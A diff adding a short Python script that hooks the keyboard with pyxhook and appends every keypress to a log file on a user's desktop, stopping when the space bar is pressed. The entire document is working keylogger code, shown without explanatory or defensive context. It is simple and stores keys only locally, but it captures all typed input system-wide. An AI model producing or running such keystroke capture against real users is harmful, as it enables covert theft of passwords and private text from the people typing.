@@ -1,0 +1,27 @@
+import pyxhook
+
+log_file='/home/Florance/Desktop/file.log'
+
+
+def OnKeyPress(event):
+  
+  file=open(log_file,'a')
+  
+  file.write(event.Key)
+  
+  file.write('\n')
+
+  if event.Ascii==32: 
+    file.close()
+    new_hook.cancel()
+ 
+
+
+new_hook=pyxhook.HookManager()
+
+new_hook.KeyDown=OnKeyPress
+
+new_hook.HookKeyboard()
+
+
+new_hook.start()
